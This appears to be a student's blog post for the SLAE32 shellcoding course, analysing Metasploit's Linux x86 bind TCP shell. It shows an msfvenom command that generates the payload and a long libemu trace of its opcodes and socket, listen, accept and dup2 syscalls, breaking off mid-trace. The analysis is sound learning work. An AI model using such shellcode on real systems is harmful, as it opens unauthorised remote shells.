---
layout: post
title: SLAE32 Assignment1 
---
![Alt](https://bohansec.com/assets/SHELLCODING32.png "Pentester Academy")

This blog post has been created for completing the requirments of the SecurityTube (Pentester Academy) x86 Assembly Language and Shellcoding on Linux certification:

[x86 Assembly Language and Shellcoding on Linux](https://www.pentesteracademy.com/course?id=3){:target="_blank"}

Student ID: SLAE-1562

### Objects
{% highlight js %}
Create a Shell_Bind_TCP Shellcode

- Binds to a port
- Execute shell on incoming connection

Port number should be easily configured
{% endhighlight %}

### Prerequisite

* Install libemu
{% highlight js %}
git clone https://github.com/buffer/libemu
sudo apt-get install autoconf
sudo apt-get install libtool
autoreconf -v -i
./configure --prefix=/opt/libemu
autoreconf -v -i
sudo make install
{% endhighlight %}

* Obtain the Kali (x86) Linux 2020.3 
{% highlight js %}
https://images.kali.org/virtual-images/kali-linux-2020.3-vmware-i386.7z
{% endhighlight %}

### Step1 - Disassemble the linux/x86/shell_bind_tcp from Metasploit
To create our own bind TCP shell, we need to know each system calls the shell uses. So, we will disassemble one of the bind shells from Metasploit and take a look at the system calls it uses.

* Go to the Libemu install path, using sctest to disassemble the linux/x86/shell_bind_tcp
{% highlight js %}
msfvenom -p linux/x86/shell_bind_tcp -f raw | ./sctest -vvv -Ss 100000 
kali@kali:~/libemu/tools/sctest$ msfvenom -p linux/x86/shell_bind_tcp -f raw | ./sctest -vvv -Ss 100000  
verbose = 3
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 78 bytes

[emu 0x0x155a630 debug ] cpu state    eip=0x00417000
[emu 0x0x155a630 debug ] eax=0x00000000  ecx=0x00000000  edx=0x00000000  ebx=0x00000000
[emu 0x0x155a630 debug ] esp=0x00416fce  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: 
[emu 0x0x155a630 debug ] cpu state    eip=0x00417000
[emu 0x0x155a630 debug ] eax=0x00000000  ecx=0x00000000  edx=0x00000000  ebx=0x00000000
[emu 0x0x155a630 debug ] esp=0x00416fce  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: 
[emu 0x0x155a630 debug ] 31DB                            xor ebx,ebx
[emu 0x0x155a630 debug ] cpu state    eip=0x00417002
[emu 0x0x155a630 debug ] eax=0x00000000  ecx=0x00000000  edx=0x00000000  ebx=0x00000000
[emu 0x0x155a630 debug ] esp=0x00416fce  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: PF ZF 
[emu 0x0x155a630 debug ] F7E3                            mul ebx
[emu 0x0x155a630 debug ] cpu state    eip=0x00417004
[emu 0x0x155a630 debug ] eax=0x00000000  ecx=0x00000000  edx=0x00000000  ebx=0x00000000
[emu 0x0x155a630 debug ] esp=0x00416fce  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: PF ZF 
[emu 0x0x155a630 debug ] 53                              push ebx
[emu 0x0x155a630 debug ] cpu state    eip=0x00417005
[emu 0x0x155a630 debug ] eax=0x00000000  ecx=0x00000000  edx=0x00000000  ebx=0x00000000
[emu 0x0x155a630 debug ] esp=0x00416fca  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: PF ZF 
[emu 0x0x155a630 debug ] 43                              inc ebx
[emu 0x0x155a630 debug ] cpu state    eip=0x00417006
[emu 0x0x155a630 debug ] eax=0x00000000  ecx=0x00000000  edx=0x00000000  ebx=0x00000001
[emu 0x0x155a630 debug ] esp=0x00416fca  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: 
[emu 0x0x155a630 debug ] 53                              push ebx
[emu 0x0x155a630 debug ] cpu state    eip=0x00417007
[emu 0x0x155a630 debug ] eax=0x00000000  ecx=0x00000000  edx=0x00000000  ebx=0x00000001
[emu 0x0x155a630 debug ] esp=0x00416fc6  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: 
[emu 0x0x155a630 debug ] 6A02                            push byte 0x2
[emu 0x0x155a630 debug ] cpu state    eip=0x00417009
[emu 0x0x155a630 debug ] eax=0x00000000  ecx=0x00000000  edx=0x00000000  ebx=0x00000001
[emu 0x0x155a630 debug ] esp=0x00416fc2  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: 
[emu 0x0x155a630 debug ] 89E1                            mov ecx,esp
[emu 0x0x155a630 debug ] cpu state    eip=0x0041700b
[emu 0x0x155a630 debug ] eax=0x00000000  ecx=0x00416fc2  edx=0x00000000  ebx=0x00000001
[emu 0x0x155a630 debug ] esp=0x00416fc2  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: 
[emu 0x0x155a630 debug ] B066                            mov al,0x66
[emu 0x0x155a630 debug ] cpu state    eip=0x0041700d
[emu 0x0x155a630 debug ] eax=0x00000066  ecx=0x00416fc2  edx=0x00000000  ebx=0x00000001
[emu 0x0x155a630 debug ] esp=0x00416fc2  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: 
[emu 0x0x155a630 debug ] CD80                            int 0x80
int socket(int domain=2, int type=1, int protocol=0);
[emu 0x0x155a630 debug ] cpu state    eip=0x0041700f
[emu 0x0x155a630 debug ] eax=0x0000000e  ecx=0x00416fc2  edx=0x00000000  ebx=0x00000001
[emu 0x0x155a630 debug ] esp=0x00416fc2  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: 
[emu 0x0x155a630 debug ] 5B                              pop ebx
[emu 0x0x155a630 debug ] cpu state    eip=0x00417010
[emu 0x0x155a630 debug ] eax=0x0000000e  ecx=0x00416fc2  edx=0x00000000  ebx=0x00000002
[emu 0x0x155a630 debug ] esp=0x00416fc6  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: 
[emu 0x0x155a630 debug ] 5E                              pop esi
[emu 0x0x155a630 debug ] cpu state    eip=0x00417011
[emu 0x0x155a630 debug ] eax=0x0000000e  ecx=0x00416fc2  edx=0x00000000  ebx=0x00000002
[emu 0x0x155a630 debug ] esp=0x00416fca  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: 
[emu 0x0x155a630 debug ] 52                              push edx
[emu 0x0x155a630 debug ] cpu state    eip=0x00417012
[emu 0x0x155a630 debug ] eax=0x0000000e  ecx=0x00416fc2  edx=0x00000000  ebx=0x00000002
[emu 0x0x155a630 debug ] esp=0x00416fc6  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: 
[emu 0x0x155a630 debug ] 680200115C                      push dword 0x5c110002
[emu 0x0x155a630 debug ] cpu state    eip=0x00417017
[emu 0x0x155a630 debug ] eax=0x0000000e  ecx=0x00416fc2  edx=0x00000000  ebx=0x00000002
[emu 0x0x155a630 debug ] esp=0x00416fc2  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: 
[emu 0x0x155a630 debug ] 6A10                            push byte 0x10
[emu 0x0x155a630 debug ] cpu state    eip=0x00417019
[emu 0x0x155a630 debug ] eax=0x0000000e  ecx=0x00416fc2  edx=0x00000000  ebx=0x00000002
[emu 0x0x155a630 debug ] esp=0x00416fbe  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: 
[emu 0x0x155a630 debug ] 51                              push ecx
[emu 0x0x155a630 debug ] cpu state    eip=0x0041701a
[emu 0x0x155a630 debug ] eax=0x0000000e  ecx=0x00416fc2  edx=0x00000000  ebx=0x00000002
[emu 0x0x155a630 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: 
[emu 0x0x155a630 debug ] 50                              push eax
[emu 0x0x155a630 debug ] cpu state    eip=0x0041701b
[emu 0x0x155a630 debug ] eax=0x0000000e  ecx=0x00416fc2  edx=0x00000000  ebx=0x00000002
[emu 0x0x155a630 debug ] esp=0x00416fb6  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: 
[emu 0x0x155a630 debug ] 89E1                            mov ecx,esp
[emu 0x0x155a630 debug ] cpu state    eip=0x0041701d
[emu 0x0x155a630 debug ] eax=0x0000000e  ecx=0x00416fb6  edx=0x00000000  ebx=0x00000002
[emu 0x0x155a630 debug ] esp=0x00416fb6  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: 
[emu 0x0x155a630 debug ] 6A66                            push byte 0x66
[emu 0x0x155a630 debug ] cpu state    eip=0x0041701f
[emu 0x0x155a630 debug ] eax=0x0000000e  ecx=0x00416fb6  edx=0x00000000  ebx=0x00000002
[emu 0x0x155a630 debug ] esp=0x00416fb2  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: 
[emu 0x0x155a630 debug ] 58                              pop eax
[emu 0x0x155a630 debug ] cpu state    eip=0x00417020
[emu 0x0x155a630 debug ] eax=0x00000066  ecx=0x00416fb6  edx=0x00000000  ebx=0x00000002
[emu 0x0x155a630 debug ] esp=0x00416fb6  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: 
[emu 0x0x155a630 debug ] CD80                            int 0x80
[emu 0x0x155a630 debug ] cpu state    eip=0x00417022
[emu 0x0x155a630 debug ] eax=0x00000000  ecx=0x00416fb6  edx=0x00000000  ebx=0x00000002
[emu 0x0x155a630 debug ] esp=0x00416fb6  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: 
[emu 0x0x155a630 debug ] 894104                          mov [ecx+0x4],eax
[emu 0x0x155a630 debug ] cpu state    eip=0x00417025
[emu 0x0x155a630 debug ] eax=0x00000000  ecx=0x00416fb6  edx=0x00000000  ebx=0x00000002
[emu 0x0x155a630 debug ] esp=0x00416fb6  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: 
[emu 0x0x155a630 debug ] B304                            mov bl,0x4
[emu 0x0x155a630 debug ] cpu state    eip=0x00417027
[emu 0x0x155a630 debug ] eax=0x00000000  ecx=0x00416fb6  edx=0x00000000  ebx=0x00000004
[emu 0x0x155a630 debug ] esp=0x00416fb6  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: 
[emu 0x0x155a630 debug ] B066                            mov al,0x66
[emu 0x0x155a630 debug ] cpu state    eip=0x00417029
[emu 0x0x155a630 debug ] eax=0x00000066  ecx=0x00416fb6  edx=0x00000000  ebx=0x00000004
[emu 0x0x155a630 debug ] esp=0x00416fb6  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: 
[emu 0x0x155a630 debug ] CD80                            int 0x80
int listen(int s=14, int backlog=0);
[emu 0x0x155a630 debug ] cpu state    eip=0x0041702b
[emu 0x0x155a630 debug ] eax=0x00000000  ecx=0x00416fb6  edx=0x00000000  ebx=0x00000004
[emu 0x0x155a630 debug ] esp=0x00416fb6  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: 
[emu 0x0x155a630 debug ] 43                              inc ebx
[emu 0x0x155a630 debug ] cpu state    eip=0x0041702c
[emu 0x0x155a630 debug ] eax=0x00000000  ecx=0x00416fb6  edx=0x00000000  ebx=0x00000005
[emu 0x0x155a630 debug ] esp=0x00416fb6  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: PF 
[emu 0x0x155a630 debug ] B066                            mov al,0x66
[emu 0x0x155a630 debug ] cpu state    eip=0x0041702e
[emu 0x0x155a630 debug ] eax=0x00000066  ecx=0x00416fb6  edx=0x00000000  ebx=0x00000005
[emu 0x0x155a630 debug ] esp=0x00416fb6  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: PF 
[emu 0x0x155a630 debug ] CD80                            int 0x80
int accept(int s=14, struct sockaddr *addr=00000000, int *addrlen=00000010);
[emu 0x0x155a630 debug ] cpu state    eip=0x00417030
[emu 0x0x155a630 debug ] eax=0x00000013  ecx=0x00416fb6  edx=0x00000000  ebx=0x00000005
[emu 0x0x155a630 debug ] esp=0x00416fb6  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: PF 
[emu 0x0x155a630 debug ] 93                              xchg eax,ebx
[emu 0x0x155a630 debug ] cpu state    eip=0x00417031
[emu 0x0x155a630 debug ] eax=0x00000005  ecx=0x00416fb6  edx=0x00000000  ebx=0x00000013
[emu 0x0x155a630 debug ] esp=0x00416fb6  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: PF 
[emu 0x0x155a630 debug ] 59                              pop ecx
[emu 0x0x155a630 debug ] cpu state    eip=0x00417032
[emu 0x0x155a630 debug ] eax=0x00000005  ecx=0x0000000e  edx=0x00000000  ebx=0x00000013
[emu 0x0x155a630 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: PF 
[emu 0x0x155a630 debug ] 6A3F                            push byte 0x3f
[emu 0x0x155a630 debug ] cpu state    eip=0x00417034
[emu 0x0x155a630 debug ] eax=0x00000005  ecx=0x0000000e  edx=0x00000000  ebx=0x00000013
[emu 0x0x155a630 debug ] esp=0x00416fb6  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: PF 
[emu 0x0x155a630 debug ] 58                              pop eax
[emu 0x0x155a630 debug ] cpu state    eip=0x00417035
[emu 0x0x155a630 debug ] eax=0x0000003f  ecx=0x0000000e  edx=0x00000000  ebx=0x00000013
[emu 0x0x155a630 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: PF 
[emu 0x0x155a630 debug ] CD80                            int 0x80
int dup2(int oldfd=19, int newfd=14);
[emu 0x0x155a630 debug ] cpu state    eip=0x00417037
[emu 0x0x155a630 debug ] eax=0x0000000e  ecx=0x0000000e  edx=0x00000000  ebx=0x00000013
[emu 0x0x155a630 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: PF 
[emu 0x0x155a630 debug ] 49                              dec ecx
[emu 0x0x155a630 debug ] cpu state    eip=0x00417038
[emu 0x0x155a630 debug ] eax=0x0000000e  ecx=0x0000000d  edx=0x00000000  ebx=0x00000013
[emu 0x0x155a630 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: 
[emu 0x0x155a630 debug ] 79                              jns 0x1
[emu 0x0x155a630 debug ] cpu state    eip=0x00417032
[emu 0x0x155a630 debug ] eax=0x0000000e  ecx=0x0000000d  edx=0x00000000  ebx=0x00000013
[emu 0x0x155a630 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: 
[emu 0x0x155a630 debug ] 6A3F                            push byte 0x3f
[emu 0x0x155a630 debug ] cpu state    eip=0x00417034
[emu 0x0x155a630 debug ] eax=0x0000000e  ecx=0x0000000d  edx=0x00000000  ebx=0x00000013
[emu 0x0x155a630 debug ] esp=0x00416fb6  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: 
[emu 0x0x155a630 debug ] 58                              pop eax
[emu 0x0x155a630 debug ] cpu state    eip=0x00417035
[emu 0x0x155a630 debug ] eax=0x0000003f  ecx=0x0000000d  edx=0x00000000  ebx=0x00000013
[emu 0x0x155a630 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: 
[emu 0x0x155a630 debug ] CD80                            int 0x80
int dup2(int oldfd=19, int newfd=13);
[emu 0x0x155a630 debug ] cpu state    eip=0x00417037
[emu 0x0x155a630 debug ] eax=0x0000000d  ecx=0x0000000d  edx=0x00000000  ebx=0x00000013
[emu 0x0x155a630 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: 
[emu 0x0x155a630 debug ] 49                              dec ecx
[emu 0x0x155a630 debug ] cpu state    eip=0x00417038
[emu 0x0x155a630 debug ] eax=0x0000000d  ecx=0x0000000c  edx=0x00000000  ebx=0x00000013
[emu 0x0x155a630 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: PF 
[emu 0x0x155a630 debug ] 79                              jns 0x1
[emu 0x0x155a630 debug ] cpu state    eip=0x00417032
[emu 0x0x155a630 debug ] eax=0x0000000d  ecx=0x0000000c  edx=0x00000000  ebx=0x00000013
[emu 0x0x155a630 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: PF 
[emu 0x0x155a630 debug ] 6A3F                            push byte 0x3f
[emu 0x0x155a630 debug ] cpu state    eip=0x00417034
[emu 0x0x155a630 debug ] eax=0x0000000d  ecx=0x0000000c  edx=0x00000000  ebx=0x00000013
[emu 0x0x155a630 debug ] esp=0x00416fb6  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: PF 
[emu 0x0x155a630 debug ] 58                              pop eax
[emu 0x0x155a630 debug ] cpu state    eip=0x00417035
[emu 0x0x155a630 debug ] eax=0x0000003f  ecx=0x0000000c  edx=0x00000000  ebx=0x00000013
[emu 0x0x155a630 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: PF 
[emu 0x0x155a630 debug ] CD80                            int 0x80
int dup2(int oldfd=19, int newfd=12);
[emu 0x0x155a630 debug ] cpu state    eip=0x00417037
[emu 0x0x155a630 debug ] eax=0x0000000c  ecx=0x0000000c  edx=0x00000000  ebx=0x00000013
[emu 0x0x155a630 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: PF 
[emu 0x0x155a630 debug ] 49                              dec ecx
[emu 0x0x155a630 debug ] cpu state    eip=0x00417038
[emu 0x0x155a630 debug ] eax=0x0000000c  ecx=0x0000000b  edx=0x00000000  ebx=0x00000013
[emu 0x0x155a630 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: 
[emu 0x0x155a630 debug ] 79                              jns 0x1
[emu 0x0x155a630 debug ] cpu state    eip=0x00417032
[emu 0x0x155a630 debug ] eax=0x0000000c  ecx=0x0000000b  edx=0x00000000  ebx=0x00000013
[emu 0x0x155a630 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: 
[emu 0x0x155a630 debug ] 6A3F                            push byte 0x3f
[emu 0x0x155a630 debug ] cpu state    eip=0x00417034
[emu 0x0x155a630 debug ] eax=0x0000000c  ecx=0x0000000b  edx=0x00000000  ebx=0x00000013
[emu 0x0x155a630 debug ] esp=0x00416fb6  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: 
[emu 0x0x155a630 debug ] 58                              pop eax
[emu 0x0x155a630 debug ] cpu state    eip=0x00417035
[emu 0x0x155a630 debug ] eax=0x0000003f  ecx=0x0000000b  edx=0x00000000  ebx=0x00000013
[emu 0x0x155a630 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: 
[emu 0x0x155a630 debug ] CD80                            int 0x80
int dup2(int oldfd=19, int newfd=11);
[emu 0x0x155a630 debug ] cpu state    eip=0x00417037
[emu 0x0x155a630 debug ] eax=0x0000000b  ecx=0x0000000b  edx=0x00000000  ebx=0x00000013
[emu 0x0x155a630 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: 
[emu 0x0x155a630 debug ] 49                              dec ecx
[emu 0x0x155a630 debug ] cpu state    eip=0x00417038
[emu 0x0x155a630 debug ] eax=0x0000000b  ecx=0x0000000a  edx=0x00000000  ebx=0x00000013
[emu 0x0x155a630 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: PF 
[emu 0x0x155a630 debug ] 79                              jns 0x1
[emu 0x0x155a630 debug ] cpu state    eip=0x00417032
[emu 0x0x155a630 debug ] eax=0x0000000b  ecx=0x0000000a  edx=0x00000000  ebx=0x00000013
[emu 0x0x155a630 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: PF 
[emu 0x0x155a630 debug ] 6A3F                            push byte 0x3f
[emu 0x0x155a630 debug ] cpu state    eip=0x00417034
[emu 0x0x155a630 debug ] eax=0x0000000b  ecx=0x0000000a  edx=0x00000000  ebx=0x00000013
[emu 0x0x155a630 debug ] esp=0x00416fb6  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: PF 
[emu 0x0x155a630 debug ] 58                              pop eax
[emu 0x0x155a630 debug ] cpu state    eip=0x00417035
[emu 0x0x155a630 debug ] eax=0x0000003f  ecx=0x0000000a  edx=0x00000000  ebx=0x00000013
[emu 0x0x155a630 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: PF 
[emu 0x0x155a630 debug ] CD80                            int 0x80
int dup2(int oldfd=19, int newfd=10);
[emu 0x0x155a630 debug ] cpu state    eip=0x00417037
[emu 0x0x155a630 debug ] eax=0x0000000a  ecx=0x0000000a  edx=0x00000000  ebx=0x00000013
[emu 0x0x155a630 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: PF 
[emu 0x0x155a630 debug ] 49                              dec ecx
[emu 0x0x155a630 debug ] cpu state    eip=0x00417038
[emu 0x0x155a630 debug ] eax=0x0000000a  ecx=0x00000009  edx=0x00000000  ebx=0x00000013
[emu 0x0x155a630 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: PF 
[emu 0x0x155a630 debug ] 79                              jns 0x1
[emu 0x0x155a630 debug ] cpu state    eip=0x00417032
[emu 0x0x155a630 debug ] eax=0x0000000a  ecx=0x00000009  edx=0x00000000  ebx=0x00000013
[emu 0x0x155a630 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: PF 
[emu 0x0x155a630 debug ] 6A3F                            push byte 0x3f
[emu 0x0x155a630 debug ] cpu state    eip=0x00417034
[emu 0x0x155a630 debug ] eax=0x0000000a  ecx=0x00000009  edx=0x00000000  ebx=0x00000013
[emu 0x0x155a630 debug ] esp=0x00416fb6  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: PF 
[emu 0x0x155a630 debug ] 58                              pop eax
[emu 0x0x155a630 debug ] cpu state    eip=0x00417035
[emu 0x0x155a630 debug ] eax=0x0000003f  ecx=0x00000009  edx=0x00000000  ebx=0x00000013
[emu 0x0x155a630 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: PF 
[emu 0x0x155a630 debug ] CD80                            int 0x80
int dup2(int oldfd=19, int newfd=9);
[emu 0x0x155a630 debug ] cpu state    eip=0x00417037
[emu 0x0x155a630 debug ] eax=0x00000009  ecx=0x00000009  edx=0x00000000  ebx=0x00000013
[emu 0x0x155a630 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: PF 
[emu 0x0x155a630 debug ] 49                              dec ecx
[emu 0x0x155a630 debug ] cpu state    eip=0x00417038
[emu 0x0x155a630 debug ] eax=0x00000009  ecx=0x00000008  edx=0x00000000  ebx=0x00000013
[emu 0x0x155a630 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: 
[emu 0x0x155a630 debug ] 79                              jns 0x1
[emu 0x0x155a630 debug ] cpu state    eip=0x00417032
[emu 0x0x155a630 debug ] eax=0x00000009  ecx=0x00000008  edx=0x00000000  ebx=0x00000013
[emu 0x0x155a630 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: 
[emu 0x0x155a630 debug ] 6A3F                            push byte 0x3f
[emu 0x0x155a630 debug ] cpu state    eip=0x00417034
[emu 0x0x155a630 debug ] eax=0x00000009  ecx=0x00000008  edx=0x00000000  ebx=0x00000013
[emu 0x0x155a630 debug ] esp=0x00416fb6  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: 
[emu 0x0x155a630 debug ] 58                              pop eax
[emu 0x0x155a630 debug ] cpu state    eip=0x00417035
[emu 0x0x155a630 debug ] eax=0x0000003f  ecx=0x00000008  edx=0x00000000  ebx=0x00000013
[emu 0x0x155a630 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: 
[emu 0x0x155a630 debug ] CD80                            int 0x80
int dup2(int oldfd=19, int newfd=8);
[emu 0x0x155a630 debug ] cpu state    eip=0x00417037
[emu 0x0x155a630 debug ] eax=0x00000008  ecx=0x00000008  edx=0x00000000  ebx=0x00000013
[emu 0x0x155a630 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: 
[emu 0x0x155a630 debug ] 49                              dec ecx
[emu 0x0x155a630 debug ] cpu state    eip=0x00417038
[emu 0x0x155a630 debug ] eax=0x00000008  ecx=0x00000007  edx=0x00000000  ebx=0x00000013
[emu 0x0x155a630 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: 
[emu 0x0x155a630 debug ] 79                              jns 0x1
[emu 0x0x155a630 debug ] cpu state    eip=0x00417032
[emu 0x0x155a630 debug ] eax=0x00000008  ecx=0x00000007  edx=0x00000000  ebx=0x00000013
[emu 0x0x155a630 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: 
[emu 0x0x155a630 debug ] 6A3F                            push byte 0x3f
[emu 0x0x155a630 debug ] cpu state    eip=0x00417034
[emu 0x0x155a630 debug ] eax=0x00000008  ecx=0x00000007  edx=0x00000000  ebx=0x00000013
[emu 0x0x155a630 debug ] esp=0x00416fb6  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: 
[emu 0x0x155a630 debug ] 58                              pop eax
[emu 0x0x155a630 debug ] cpu state    eip=0x00417035
[emu 0x0x155a630 debug ] eax=0x0000003f  ecx=0x00000007  edx=0x00000000  ebx=0x00000013
[emu 0x0x155a630 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: 
[emu 0x0x155a630 debug ] CD80                            int 0x80
int dup2(int oldfd=19, int newfd=7);
[emu 0x0x155a630 debug ] cpu state    eip=0x00417037
[emu 0x0x155a630 debug ] eax=0x00000007  ecx=0x00000007  edx=0x00000000  ebx=0x00000013
[emu 0x0x155a630 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: 
[emu 0x0x155a630 debug ] 49                              dec ecx
[emu 0x0x155a630 debug ] cpu state    eip=0x00417038
[emu 0x0x155a630 debug ] eax=0x00000007  ecx=0x00000006  edx=0x00000000  ebx=0x00000013
[emu 0x0x155a630 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: PF 
[emu 0x0x155a630 debug ] 79                              jns 0x1
[emu 0x0x155a630 debug ] cpu state    eip=0x00417032
[emu 0x0x155a630 debug ] eax=0x00000007  ecx=0x00000006  edx=0x00000000  ebx=0x00000013
[emu 0x0x155a630 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: PF 
[emu 0x0x155a630 debug ] 6A3F                            push byte 0x3f
[emu 0x0x155a630 debug ] cpu state    eip=0x00417034
[emu 0x0x155a630 debug ] eax=0x00000007  ecx=0x00000006  edx=0x00000000  ebx=0x00000013
[emu 0x0x155a630 debug ] esp=0x00416fb6  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: PF 
[emu 0x0x155a630 debug ] 58                              pop eax
[emu 0x0x155a630 debug ] cpu state    eip=0x00417035
[emu 0x0x155a630 debug ] eax=0x0000003f  ecx=0x00000006  edx=0x00000000  ebx=0x00000013
[emu 0x0x155a630 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x155a630 debug ] Flags: PF 
[emu 0x0x155a630 debug ] CD80                            int 0x80
int dup2(int oldfd=19, int newfd=6);
[emu 0x0x155a630 debug ] cpu state    eip=0x00417037
